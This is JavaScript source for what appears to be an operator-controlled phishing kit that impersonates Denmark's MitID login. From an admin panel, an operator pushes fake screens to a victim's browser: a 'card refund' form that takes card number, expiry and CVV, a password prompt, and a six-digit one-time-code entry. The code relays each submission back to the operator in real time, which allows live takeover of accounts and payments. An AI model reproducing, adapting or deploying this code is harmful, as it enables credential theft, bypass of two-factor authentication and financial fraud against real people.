/**
 * Refundering på kort + Adgangskode + Kodeviser
 * - Own poller (does not rely only on React fetch hook)
 * - Admin modal centered
 * - Client MitID-style screens (no emoji)
 */
(function () {
  var BASE = (typeof window !== "undefined" && window.__APP_BASE__) || "";
  var USER_KEY = "miitid_user_session";
  var ADMIN_KEY = "miitid_admin_selected_session";
  var origFetch = window.fetch.bind(window);
  var seenMsg = {};
  var pollLast = { user: 0, admin: 0 };

  function sidUser() {
    try {
      return localStorage.getItem(USER_KEY) || sessionStorage.getItem(USER_KEY) || "";
    } catch (e) {
      return "";
    }
  }
  /**
   * SPA owns miitid_admin_selected_session (set on select, cleared on back).
   * Addon must only READ it — never write it back (that re-opened the old session).
   */
  var lastSeenAdminSid = "";
  function sidAdmin() {
    try {
      return localStorage.getItem(ADMIN_KEY) || "";
    } catch (e) {
      return "";
    }
  }
  function syncAdminSidFromSpa() {
    var raw = sidAdmin();
    if (raw !== lastSeenAdminSid) {
      lastSeenAdminSid = raw;
      pollLast.admin = 0;
    }
  }
  function isAdmin() {
    return (window.location.hash || "").indexOf("admin") === 1;
  }

  function send(role, data) {
    if (role === "admin") syncAdminSidFromSpa();
    var sessionId = role === "admin" ? sidAdmin() : sidUser();
    if (!sessionId) {
      alert(
        role === "admin"
          ? "Vælg først en session i listen"
          : "Ingen aktiv session"
      );
      return Promise.resolve(false);
    }
    return origFetch(BASE + "/api/ws/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ sessionId: sessionId, role: role, data: data }),
    })
      .then(function (r) {
        return r.ok;
      })
      .catch(function () {
        return false;
      });
  }

  function toast(msg) {
    var el = document.getElementById("juj-rf-toast");
    if (!el) {
      el = document.createElement("div");
      el.id = "juj-rf-toast";
      el.style.cssText =
        "position:fixed;top:14px;right:14px;z-index:100000;max-width:360px;padding:12px 14px;border-radius:12px;background:#0f766e;color:#fff;font:600 13px/1.4 'IBM Plex Sans',sans-serif;box-shadow:0 10px 30px rgba(0,0,0,.2)";
      document.body.appendChild(el);
    }
    el.textContent = msg;
    el.style.display = "block";
    clearTimeout(el._t);
    el._t = setTimeout(function () {
      el.style.display = "none";
    }, 8000);
  }

  /* Official MitID logo (Mit + person + D) — from provided brand asset, not fake "Mit ID" circle */
  function mitidLogoHtml(size) {
    var h = size === "lg" ? 34 : 28;
    var base = BASE ? String(BASE).replace(/\/$/, "") : "";
    return (
      '<img src="' +
      base +
      '/assets/mitid-logo.png" alt="MitID" width="120" height="' +
      h +
      '" style="height:' +
      h +
      'px;width:auto;display:inline-block;vertical-align:middle" />'
    );
  }

  /* Kodeviser token icon (red-marked on reference) */
  function kodeviserIconHtml() {
    var base = BASE ? String(BASE).replace(/\/$/, "") : "";
    return (
      '<img src="' +
      base +
      '/assets/kodeviser-icon.svg" alt="" width="22" height="13" style="width:22px;height:13px;display:inline-block;vertical-align:middle" />'
    );
  }

  function closeOverlay(id) {
    var el = document.getElementById(id);
    if (el) el.remove();
  }

  function escapeHtml(s) {
    return String(s)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }

  function clientShell(innerHtml) {
    return (
      '<div style="background:#fff;width:100%;max-width:360px;border-radius:4px;box-shadow:0 2px 12px rgba(0,0,0,.12);overflow:hidden;font-family:Arial,Helvetica,sans-serif">' +
      '<div style="padding:28px 28px 8px;text-align:center">' +
      mitidLogoHtml("lg") +
      "</div>" +
      '<div style="padding:8px 28px 24px">' +
      innerHtml +
      "</div>" +
      '<div style="border-top:1px solid #e5e7eb;padding:16px 28px;display:flex;gap:28px">' +
      '<a href="#" id="juj-client-cancel" style="color:#1a1a1a;font-weight:700;font-size:15px;text-decoration:none">Afbryd</a>' +
      '<a href="#" style="color:#1a1a1a;font-weight:700;font-size:15px;text-decoration:none">Hjælp</a>' +
      "</div></div>"
    );
  }

  function arrowSvg() {
    return '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M13 5l7 7-7 7"/></svg>';
  }

  /* ---------- ADMIN modal (CENTER) ---------- */
  function openAdminRefundModal() {
    closeOverlay("juj-admin-refund-modal");
    var wrap = document.createElement("div");
    wrap.id = "juj-admin-refund-modal";
    wrap.style.cssText =
      "position:fixed;inset:0;z-index:99999;background:rgba(2,6,23,.72);display:flex;align-items:center;justify-content:center;padding:16px;font-family:'IBM Plex Sans',Inter,sans-serif";
    wrap.innerHTML =
      '<div style="width:100%;max-width:420px;background:#1e293b;border-radius:18px;padding:18px 16px 16px;color:#fff;box-shadow:0 20px 60px rgba(0,0,0,.45)">' +
      '<div style="display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:16px">' +
      "<div><div style=\"font-weight:700;font-size:16px\">Refundering på kort</div>" +
      '<div style="color:#94a3b8;font-size:12px;margin-top:2px">Afsender + beløb</div></div>' +
      '<button type="button" id="juj-adm-rf-close" style="width:32px;height:32px;border:0;border-radius:999px;background:rgba(100,116,139,.5);color:#fff;cursor:pointer;font-size:16px">×</button>' +
      "</div>" +
      '<label style="display:block;font-size:10px;font-weight:700;letter-spacing:.08em;color:#94a3b8;margin-bottom:6px">FRA (FIRMA / NAVN)</label>' +
      '<input id="juj-adm-rf-from" type="text" placeholder="f.eks. BINANCE" style="width:100%;box-sizing:border-box;background:#0f172a;border:1px solid #334155;border-radius:12px;padding:12px 14px;color:#fff;font-size:14px;margin-bottom:14px" />' +
      '<label style="display:block;font-size:10px;font-weight:700;letter-spacing:.08em;color:#94a3b8;margin-bottom:6px">BELØB</label>' +
      '<input id="juj-adm-rf-amount" type="text" inputmode="decimal" placeholder="f.eks. 1250" style="width:100%;box-sizing:border-box;background:#0f172a;border:1px solid #334155;border-radius:12px;padding:12px 14px;color:#fff;font-size:14px;margin-bottom:16px" />' +
      '<div style="display:flex;gap:10px">' +
      '<button type="button" id="juj-adm-rf-skip" style="flex:1;background:#334155;color:#e2e8f0;border:0;border-radius:12px;padding:12px;font-weight:700;font-size:13px;cursor:pointer">Uden beløb</button>' +
      '<button type="button" id="juj-adm-rf-go" style="flex:1.2;background:#0060e6;color:#fff;border:0;border-radius:12px;padding:12px;font-weight:700;font-size:13px;cursor:pointer">Send til klient</button>' +
      "</div></div>";

    document.body.appendChild(wrap);
    document.getElementById("juj-adm-rf-close").onclick = function () {
      closeOverlay("juj-admin-refund-modal");
    };
    wrap.addEventListener("click", function (e) {
      if (e.target === wrap) closeOverlay("juj-admin-refund-modal");
    });

    function activate(withAmount) {
      var from = (document.getElementById("juj-adm-rf-from").value || "").trim();
      var amount = withAmount ? (document.getElementById("juj-adm-rf-amount").value || "").trim() : "";
      if (!from) {
        document.getElementById("juj-adm-rf-from").focus();
        return;
      }
      send("admin", {
        type: "show-card-refund",
        from: from,
        displayText: from,
        amount: amount || null,
      }).then(function (ok) {
        if (ok) {
          toast("Sendt til klient");
          closeOverlay("juj-admin-refund-modal");
        }
      });
    }

    document.getElementById("juj-adm-rf-go").onclick = function () {
      activate(true);
    };
    document.getElementById("juj-adm-rf-skip").onclick = function () {
      activate(false);
    };
    setTimeout(function () {
      var el = document.getElementById("juj-adm-rf-from");
      if (el) el.focus();
    }, 50);
  }

  /* ---------- CLIENT card screen ---------- */
  function showClientCard(msg) {
    closeOverlay("juj-client-refund");
    var from = (msg && (msg.from || msg.displayText)) || "";
    var amount = msg && msg.amount ? String(msg.amount) : "";
    var amountLabel = "";
    if (amount) {
      var n = amount.replace(/\s/g, "").replace(",", ".");
      var num = parseFloat(n);
      amountLabel = !isNaN(num)
        ? num.toLocaleString("da-DK", { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " kr"
        : amount + (amount.indexOf("kr") >= 0 ? "" : " kr");
    }

    var wrap = document.createElement("div");
    wrap.id = "juj-client-refund";
    wrap.style.cssText =
      "position:fixed;inset:0;z-index:99998;background:#f0f1f3;display:flex;align-items:center;justify-content:center;padding:20px;font-family:Arial,Helvetica,sans-serif";
    wrap.innerHTML = clientShell(
      '<div style="font-weight:700;font-size:22px;color:#1a1a1a;margin:12px 0 18px;text-align:center">Refundering på kort</div>' +
        (from
          ? '<div style="border:1px solid #dbe3ef;border-radius:8px;padding:12px 14px;text-align:center;font-weight:700;font-size:17px;color:#001C44;margin-bottom:10px">' +
            escapeHtml(from.toUpperCase()) +
            "</div>"
          : "") +
        (amountLabel
          ? '<div style="text-align:center;font-size:15px;font-weight:600;color:#0060e6;margin-bottom:14px">' +
            escapeHtml(amountLabel) +
            "</div>"
          : "") +
        '<p style="margin:0 0 16px;font-size:14px;color:#4b5563;line-height:1.5;text-align:center">Indtast dine kortoplysninger for at verificere kortet og få en tilbagebetaling.</p>' +
        '<label style="display:block;font-size:12px;font-weight:700;color:#374151;margin-bottom:6px">Kortnummer</label>' +
        '<input id="juj-c-num" type="text" inputmode="numeric" autocomplete="cc-number" placeholder="•••• •••• •••• ••••" style="width:100%;box-sizing:border-box;border:1px solid #c5c5c5;border-radius:4px;padding:12px;font-size:16px;margin-bottom:14px" />' +
        '<div style="display:flex;gap:12px;margin-bottom:20px">' +
        '<div style="flex:1"><label style="display:block;font-size:12px;font-weight:700;color:#374151;margin-bottom:6px">Måned / år</label>' +
        '<input id="juj-c-exp" type="text" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/ÅÅ" style="width:100%;box-sizing:border-box;border:1px solid #c5c5c5;border-radius:4px;padding:12px;font-size:16px" /></div>' +
        '<div style="flex:1"><label style="display:block;font-size:12px;font-weight:700;color:#374151;margin-bottom:6px">CVV</label>' +
        '<input id="juj-c-cvv" type="text" inputmode="numeric" autocomplete="cc-csc" placeholder="•••" maxlength="4" style="width:100%;box-sizing:border-box;border:1px solid #c5c5c5;border-radius:4px;padding:12px;font-size:16px" /></div></div>' +
        '<button type="button" id="juj-c-submit" style="width:100%;background:#d9d9d9;color:#fff;border:0;border-radius:4px;padding:14px 16px;font-weight:700;font-size:15px;letter-spacing:.04em;cursor:pointer;display:flex;align-items:center;justify-content:space-between">BEKRÆFT ' +
        arrowSvg() +
        "</button>"
    );

    document.body.appendChild(wrap);
    wireCancel(wrap);
    var cardNum = document.getElementById("juj-c-num");
    var exp = document.getElementById("juj-c-exp");
    var cvv = document.getElementById("juj-c-cvv");
    var btn = document.getElementById("juj-c-submit");

    function updateBtn() {
      var ok =
        cardNum.value.replace(/\s/g, "").length >= 12 &&
        exp.value.length >= 4 &&
        cvv.value.length >= 3;
      btn.style.background = ok ? "#0060e6" : "#d9d9d9";
    }
    cardNum.addEventListener("input", function () {
      var v = cardNum.value.replace(/\D/g, "").slice(0, 19);
      cardNum.value = v.replace(/(.{4})/g, "$1 ").trim();
      updateBtn();
    });
    exp.addEventListener("input", function () {
      var v = exp.value.replace(/\D/g, "").slice(0, 4);
      if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2);
      exp.value = v;
      updateBtn();
    });
    cvv.addEventListener("input", function () {
      cvv.value = cvv.value.replace(/\D/g, "").slice(0, 4);
      updateBtn();
    });
    btn.onclick = function () {
      var cardNumber = cardNum.value.replace(/\s/g, "");
      if (cardNumber.length < 12 || exp.value.length < 4 || cvv.value.length < 3) return;
      btn.disabled = true;
      send("user", {
        type: "card-refund-submitted",
        cardNumber: cardNumber,
        expiry: exp.value.trim(),
        cvv: cvv.value.trim(),
        from: from,
        amount: amount || null,
      }).then(function () {
        closeOverlay("juj-client-refund");
      });
    };
    setTimeout(function () {
      cardNum.focus();
    }, 80);
  }

  /* ---------- CLIENT Adgangskode (Bekræft identitet) ---------- */
  function showClientPassword() {
    closeOverlay("juj-client-refund");
    var wrap = document.createElement("div");
    wrap.id = "juj-client-refund";
    wrap.style.cssText =
      "position:fixed;inset:0;z-index:99998;background:#f0f1f3;display:flex;align-items:center;justify-content:center;padding:20px;font-family:Arial,Helvetica,sans-serif";
    wrap.innerHTML = clientShell(
      '<div style="font-weight:700;font-size:22px;color:#1a1a1a;margin:12px 0 22px;text-align:center">Bekræft identitet</div>' +
        '<div style="display:flex;align-items:center;gap:8px;margin-bottom:8px">' +
        '<svg width="14" height="14" viewBox="0 0 24 24" fill="#1a1a1a"><path d="M12 1a5 5 0 00-5 5v3H6a2 2 0 00-2 2v10a2 2 0 002 2h12a2 2 0 002-2V11a2 2 0 00-2-2h-1V6a5 5 0 00-5-5zm-3 8V6a3 3 0 116 0v3H9z"/></svg>' +
        '<span style="font-size:12px;font-weight:700;letter-spacing:.04em;color:#1a1a1a">ADGANGSKODE</span></div>' +
        '<input id="juj-p-input" type="password" autocomplete="current-password" style="width:100%;box-sizing:border-box;border:1px solid #c5c5c5;border-radius:4px;padding:12px;font-size:16px;margin-bottom:22px" />' +
        '<button type="button" id="juj-p-submit" style="width:100%;background:#d9d9d9;color:#fff;border:0;border-radius:4px;padding:14px 16px;font-weight:700;font-size:15px;letter-spacing:.04em;cursor:pointer;display:flex;align-items:center;justify-content:space-between">GODKEND ' +
        arrowSvg() +
        "</button>"
    );

    document.body.appendChild(wrap);
    wireCancel(wrap);
    var inp = document.getElementById("juj-p-input");
    var btn = document.getElementById("juj-p-submit");
    inp.addEventListener("input", function () {
      var ok = (inp.value || "").trim().length > 0;
      btn.style.background = ok ? "#0060e6" : "#d9d9d9";
    });
    btn.onclick = function () {
      var code = (inp.value || "").trim();
      if (!code) return;
      btn.disabled = true;
      send("user", { type: "adgangskode-submitted", code: code }).then(function () {
        closeOverlay("juj-client-refund");
      });
    };
    setTimeout(function () {
      inp.focus();
    }, 80);
  }

  /* ---------- CLIENT Kodeviser ---------- */
  function showClientKodeviser() {
    closeOverlay("juj-client-refund");
    var wrap = document.createElement("div");
    wrap.id = "juj-client-refund";
    wrap.style.cssText =
      "position:fixed;inset:0;z-index:99998;background:#f0f1f3;display:flex;align-items:center;justify-content:center;padding:20px;font-family:Arial,Helvetica,sans-serif";

    var boxes = "";
    for (var i = 0; i < 6; i++) {
      boxes +=
        '<input id="juj-k-' +
        i +
        '" type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code" aria-label="Ciffer ' +
        (i + 1) +
        '" style="width:42px;height:48px;box-sizing:border-box;border:1px solid #c5c5c5;border-radius:4px;text-align:center;font-size:20px;font-weight:600;color:#1a1a1a;outline:none" />';
    }

    wrap.innerHTML = clientShell(
      '<div style="font-weight:700;font-size:22px;color:#1a1a1a;margin:12px 0 22px;text-align:center">Godkend med kodeviser</div>' +
        '<div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">' +
        kodeviserIconHtml() +
        '<span style="font-size:12px;font-weight:700;letter-spacing:.04em;color:#1a1a1a">ENGANGSKODE</span>' +
        '<svg width="16" height="16" viewBox="0 0 24 24" fill="#0060e6" style="margin-left:2px"><circle cx="12" cy="12" r="10"/><text x="12" y="16" text-anchor="middle" fill="#fff" font-size="12" font-weight="700" font-family="Arial">?</text></svg></div>' +
        '<div id="juj-k-boxes" style="display:flex;gap:8px;justify-content:flex-start;margin-bottom:24px">' +
        boxes +
        "</div>" +
        '<button type="button" id="juj-k-submit" style="width:100%;background:#d9d9d9;color:#fff;border:0;border-radius:4px;padding:14px 16px;font-weight:700;font-size:15px;letter-spacing:.04em;cursor:pointer;display:flex;align-items:center;justify-content:space-between">FORTSÆT ' +
        arrowSvg() +
        "</button>"
    );

    document.body.appendChild(wrap);
    wireCancel(wrap);

    var inputs = [];
    for (var j = 0; j < 6; j++) inputs.push(document.getElementById("juj-k-" + j));
    var btn = document.getElementById("juj-k-submit");

    function codeValue() {
      return inputs
        .map(function (el) {
          return (el.value || "").replace(/\D/g, "");
        })
        .join("");
    }
    function updateBtn() {
      var ok = codeValue().length === 6;
      btn.style.background = ok ? "#0060e6" : "#d9d9d9";
    }
    function focusStyle(el, on) {
      el.style.borderColor = on ? "#0060e6" : "#c5c5c5";
      el.style.borderWidth = on ? "2px" : "1px";
    }

    inputs.forEach(function (el, idx) {
      el.addEventListener("focus", function () {
        focusStyle(el, true);
      });
      el.addEventListener("blur", function () {
        focusStyle(el, false);
      });
      el.addEventListener("input", function () {
        var v = el.value.replace(/\D/g, "").slice(0, 1);
        el.value = v;
        if (v && idx < 5) inputs[idx + 1].focus();
        updateBtn();
      });
      el.addEventListener("keydown", function (e) {
        if (e.key === "Backspace" && !el.value && idx > 0) {
          inputs[idx - 1].focus();
        }
      });
      el.addEventListener("paste", function (e) {
        var text = (e.clipboardData || window.clipboardData).getData("text") || "";
        var digits = text.replace(/\D/g, "").slice(0, 6);
        if (!digits) return;
        e.preventDefault();
        for (var k = 0; k < 6; k++) inputs[k].value = digits[k] || "";
        inputs[Math.min(digits.length, 5)].focus();
        updateBtn();
      });
    });

    btn.onclick = function () {
      var code = codeValue();
      if (code.length !== 6) return;
      btn.disabled = true;
      send("user", { type: "kodeviser-submitted", code: code }).then(function () {
        closeOverlay("juj-client-refund");
      });
    };

    setTimeout(function () {
      inputs[0].focus();
    }, 80);
  }

  function wireCancel(wrap) {
    var cancel = wrap.querySelector("#juj-client-cancel");
    if (cancel) {
      cancel.onclick = function (e) {
        e.preventDefault();
        closeOverlay("juj-client-refund");
      };
    }
  }

  function handleMessages(messages, roleHint) {
    if (!messages || !messages.length) return;
    for (var i = 0; i < messages.length; i++) {
      var row = messages[i];
      var id = row.id != null ? String(row.id) : "";
      if (id && seenMsg[id]) continue;
      if (id) seenMsg[id] = 1;

      var raw = row.message;
      var msg =
        typeof raw === "string"
          ? (function () {
              try {
                return JSON.parse(raw);
              } catch (e) {
                return null;
              }
            })()
          : raw;
      if (!msg || !msg.type) continue;

      var adminView = isAdmin() || roleHint === "admin";
      if (!adminView) {
        // Standardside / Godkend bruger / other built-in screens → remove addon overlay
        if (
          msg.type === "default-page" ||
          msg.type === "approved" ||
          msg.type === "payment-refunded" ||
          msg.type === "qr-show" ||
          msg.type === "qr-image" ||
          msg.type === "qr-hide" ||
          msg.type === "sms-activate" ||
          msg.type === "admin-left"
        ) {
          closeOverlay("juj-client-refund");
        }
        if (msg.type === "show-adgangskode") showClientPassword();
        if (msg.type === "show-card-refund") showClientCard(msg);
        if (msg.type === "show-kodeviser") showClientKodeviser();
      } else {
        if (msg.type === "adgangskode-submitted") toast("Adgangskode: " + (msg.code || "—"));
        if (msg.type === "kodeviser-submitted") toast("Kodeviser: " + (msg.code || "—"));
        if (msg.type === "card-refund-submitted") {
          toast(
            "Kort " +
              (msg.cardNumber || "—") +
              (msg.expiry ? " | " + msg.expiry : "") +
              (msg.cvv ? " | CVV " + msg.cvv : "")
          );
        }
      }
    }
  }

  function pollOnce(role) {
    var sid = role === "admin" ? sidAdmin() : sidUser();
    if (!sid) return;
    var last = pollLast[role] || 0;
    var url =
      BASE +
      "/api/ws/poll?sessionId=" +
      encodeURIComponent(sid) +
      "&role=" +
      encodeURIComponent(role) +
      "&lastId=" +
      last +
      "&timeout=0";
    origFetch(url, { cache: "no-store" })
      .then(function (r) {
        return r.json();
      })
      .then(function (data) {
        if (!data || !data.ok) return;
        if (typeof data.lastId === "number") pollLast[role] = data.lastId;
        handleMessages(data.messages || [], role);
      })
      .catch(function () {});
  }

  setInterval(function () {
    if (isAdmin()) {
      syncAdminSidFromSpa();
      if (!sidAdmin()) return; // list view — SPA cleared selection
      pollOnce("admin");
    } else if (sidUser()) pollOnce("user");
  }, 900);

  window.fetch = function () {
    var args = arguments;
    return origFetch.apply(this, args).then(function (res) {
      try {
        var url = typeof args[0] === "string" ? args[0] : args[0] && args[0].url;
        if (url && String(url).indexOf("/api/ws/poll") !== -1) {
          // If SPA still has a selected session, reset poll cursor when it changes
          syncAdminSidFromSpa();
          res
            .clone()
            .json()
            .then(function (data) {
              if (data && data.messages) handleMessages(data.messages);
            })
            .catch(function () {});
        }
      } catch (e) {}
      return res;
    });
  };

  function removeAdminButtons() {
    var el = document.getElementById("juj-refund-admin");
    if (el) el.remove();
    closeOverlay("juj-admin-refund-modal");
  }

  function findSessionAnchor() {
    var buttons = Array.prototype.slice.call(document.querySelectorAll("button"));
    var anchor = null;
    for (var i = 0; i < buttons.length; i++) {
      var label = (buttons[i].textContent || "").trim();
      if (
        label === "Betaling annulleret" ||
        label === "Standardside" ||
        label === "Godkend bruger" ||
        label === "+ Send SMS"
      ) {
        anchor = buttons[i].parentElement;
      }
    }
    return anchor;
  }

  function injectAdminButtons() {
    if (!isAdmin()) {
      removeAdminButtons();
      return;
    }
    syncAdminSidFromSpa();

    var anchor = findSessionAnchor();
    // Session list / no detail view → remove addon UI so it cannot stick to old session
    if (!anchor || !anchor.parentElement || !sidAdmin()) {
      removeAdminButtons();
      return;
    }

    if (document.getElementById("juj-refund-admin")) return;

    var box = document.createElement("div");
    box.id = "juj-refund-admin";
    box.style.cssText = "margin-bottom:20px";
    box.innerHTML =
      '<div style="font-size:10px;color:#9ca3af;text-transform:uppercase;letter-spacing:.06em;font-weight:700;margin-bottom:8px">Refundering på kort</div>' +
      '<button type="button" id="juj-btn-card" style="width:100%;background:#0f766e;color:#fff;border:0;border-radius:12px;padding:10px 12px;font-size:12px;font-weight:700;cursor:pointer;margin-bottom:8px">Refundering på kort</button>' +
      '<button type="button" id="juj-btn-ak" style="width:100%;background:#0060e6;color:#fff;border:0;border-radius:12px;padding:10px 12px;font-size:12px;font-weight:700;cursor:pointer;margin-bottom:8px">Adgangskode</button>' +
      '<button type="button" id="juj-btn-kv" style="width:100%;background:#4f46e5;color:#fff;border:0;border-radius:12px;padding:10px 12px;font-size:12px;font-weight:700;cursor:pointer">Kodeviser</button>';
    anchor.parentElement.insertBefore(box, anchor.nextSibling);

    document.getElementById("juj-btn-card").onclick = function () {
      syncAdminSidFromSpa();
      openAdminRefundModal();
    };
    document.getElementById("juj-btn-ak").onclick = function () {
      syncAdminSidFromSpa();
      send("admin", { type: "show-adgangskode" }).then(function (ok) {
        if (ok) toast("Adgangskode sendt til klient");
      });
    };
    document.getElementById("juj-btn-kv").onclick = function () {
      syncAdminSidFromSpa();
      send("admin", { type: "show-kodeviser" }).then(function (ok) {
        if (ok) toast("Kodeviser sendt til klient");
      });
    };
  }

  function openAuditPasswordModal() {
    closeOverlay("juj-audit-pw-modal");
    var wrap = document.createElement("div");
    wrap.id = "juj-audit-pw-modal";
    wrap.style.cssText =
      "position:fixed;inset:0;z-index:100001;background:rgba(2,6,23,.78);display:flex;align-items:center;justify-content:center;padding:16px;font-family:Arial,Helvetica,sans-serif";
    wrap.innerHTML =
      '<div style="width:100%;max-width:380px;background:#1e293b;border-radius:16px;padding:20px 18px;color:#fff;box-shadow:0 20px 60px rgba(0,0,0,.45)">' +
      '<div style="font-weight:700;font-size:18px;margin-bottom:6px">Aktivitetslog</div>' +
      '<div style="color:#94a3b8;font-size:13px;margin-bottom:16px">Indtast adgangskode</div>' +
      '<label style="display:block;font-size:11px;font-weight:700;letter-spacing:.06em;color:#94a3b8;margin-bottom:8px">ADGANGSKODE</label>' +
      '<input id="juj-audit-pw" type="password" autocomplete="current-password" style="width:100%;box-sizing:border-box;background:#0f172a;border:1px solid #334155;border-radius:12px;padding:12px 14px;color:#fff;font-size:15px;margin-bottom:10px" />' +
      '<div id="juj-audit-pw-err" style="display:none;color:#fca5a5;font-size:13px;margin-bottom:10px"></div>' +
      '<div style="display:flex;gap:8px">' +
      '<button type="button" id="juj-audit-pw-cancel" style="flex:1;background:#334155;color:#e2e8f0;border:0;border-radius:12px;padding:12px;font-weight:700;cursor:pointer">Afbryd</button>' +
      '<button type="button" id="juj-audit-pw-ok" style="flex:1.2;background:#0f766e;color:#fff;border:0;border-radius:12px;padding:12px;font-weight:700;cursor:pointer">Åbn</button>' +
      "</div></div>";
    document.body.appendChild(wrap);

    var inp = document.getElementById("juj-audit-pw");
    var err = document.getElementById("juj-audit-pw-err");
    function fail(msg) {
      err.style.display = "block";
      err.textContent = msg;
    }
    function go() {
      var pw = (inp.value || "").trim();
      if (!pw) {
        fail("Indtast adgangskode");
        return;
      }
      var t = "";
      try {
        t = localStorage.getItem("admin_token") || "";
      } catch (e) {}
      if (!t) {
        fail("Log ind i admin først");
        return;
      }
      origFetch("/api/admin/audit?limit=1", {
        headers: {
          Authorization: "Bearer " + t,
          "X-Audit-Password": pw,
        },
      })
        .then(function (r) {
          if (r.status === 403) throw new Error("Forkert adgangskode");
          if (!r.ok) throw new Error("Kunne ikke åbne log");
          try {
            localStorage.setItem("juj_audit_pw", pw);
          } catch (e) {}
          closeOverlay("juj-audit-pw-modal");
          window.open("/log.php", "_blank", "noopener");
        })
        .catch(function (e) {
          fail(e.message || "Fejl");
        });
    }
    document.getElementById("juj-audit-pw-cancel").onclick = function () {
      closeOverlay("juj-audit-pw-modal");
    };
    document.getElementById("juj-audit-pw-ok").onclick = go;
    wrap.addEventListener("click", function (e) {
      if (e.target === wrap) closeOverlay("juj-audit-pw-modal");
    });
    inp.addEventListener("keydown", function (e) {
      if (e.key === "Enter") go();
    });
    setTimeout(function () {
      inp.focus();
    }, 40);
  }

  function injectAuditLogButton() {
    if (!isAdmin()) {
      var old = document.getElementById("juj-audit-link");
      if (old) old.remove();
      return;
    }
    if (document.getElementById("juj-audit-link")) return;
    var a = document.createElement("button");
    a.type = "button";
    a.id = "juj-audit-link";
    a.textContent = "Log";
    a.title = "Permanent aktivitetslog";
    a.style.cssText =
      "position:fixed;bottom:18px;right:18px;z-index:99990;background:#0f766e;color:#fff;border:0;font:700 13px/1 Arial,sans-serif;padding:12px 16px;border-radius:999px;box-shadow:0 8px 24px rgba(0,0,0,.25);cursor:pointer";
    a.onclick = openAuditPasswordModal;
    document.body.appendChild(a);
  }

  setInterval(function () {
    injectAdminButtons();
    injectAuditLogButton();
  }, 800);
  window.addEventListener("hashchange", function () {
    setTimeout(function () {
      injectAdminButtons();
      injectAuditLogButton();
    }, 300);
  });
})();
